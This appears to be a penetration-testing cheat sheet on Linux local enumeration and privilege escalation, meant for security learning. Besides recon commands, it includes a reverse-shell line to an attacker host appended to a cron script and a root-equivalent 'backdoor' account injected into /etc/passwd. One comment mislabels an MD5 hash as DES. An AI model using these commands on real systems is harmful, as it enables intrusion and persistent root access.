# Linux Local Enumeration

!!! tip "Quick win order"
    1. `sudo -l` — misconfigured sudo is the most common Linux privesc
    2. SUID binaries: `find / -perm -4000 2>/dev/null` — check against GTFOBins
    3. Writable cron jobs: `cat /etc/cron* /etc/cron.d/*` and check script permissions
    4. Running as a service account? Check what the service binary does and if it's writable
    5. Check `/etc/passwd` for writable entries
    6. Kernel version: `uname -r` — only exploit if nothing else works, kernel exploits are noisy

---

## Basic Host Information

```bash
whoami && id                 # Current user & groups
hostname && uname -a         # Hostname & system info
cat /etc/issue               # OS version
cat /etc/passwd              # User list
cat /etc/shadow              # If readable, privilege escalation possible
cat /etc/os-release          # OS release
dpkg -l                      # List all installed packages
```

### Active Sessions

```bash
w
who
last
```

---

## Cron Job Enumeration

```bash
crontab -l
cat /etc/crontab
ls -lah /etc/cron*
grep "CRON" /var/log/syslog
```

### Exploit a Writable Cron Job

```bash
echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /path/to/script.sh
nc -lvnp 4444
```

---

## File Permission Enumeration

```bash
find / -writable -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # GUID
```

Check binary strings:

```bash
strings /usr/bin/passwd
```

---

## Sensitive Files

```bash
grep -iR --color=always 'password' .
grep -r "password" /etc/
find / -name "*.conf" -exec grep -i password {} \; 2>/dev/null
ls -l /etc/shadow
```

---

## Running Processes

```bash
ps aux | grep root
netstat -ano
ps aux
ss -anp
```

---

## Mounts

```bash
cat /etc/fstab
mount
lsblk
```

---

## Writable `/etc/passwd`

Only works if `/etc/passwd` is world-writable (rare but misconfigured systems and older CTFs). Check first:

```bash
ls -la /etc/passwd
# -rw-rw-rw-  → writable by anyone
```

If writable, inject a new root-equivalent account:

```bash
# Generate a DES hash (still accepted by /etc/passwd second field)
openssl passwd -1 -salt salt P@ssw0rd

# Append the account — UID 0 makes it root-equivalent
echo 'backdoor:$1$salt$vB.u3LdTp/JX5TjPzdTt00:0:0:root:/root:/bin/bash' >> /etc/passwd
su backdoor
```

---

## Abusing Sudo

```bash
sudo -l
```

Check any allowed binaries against GTFOBins for privesc paths.
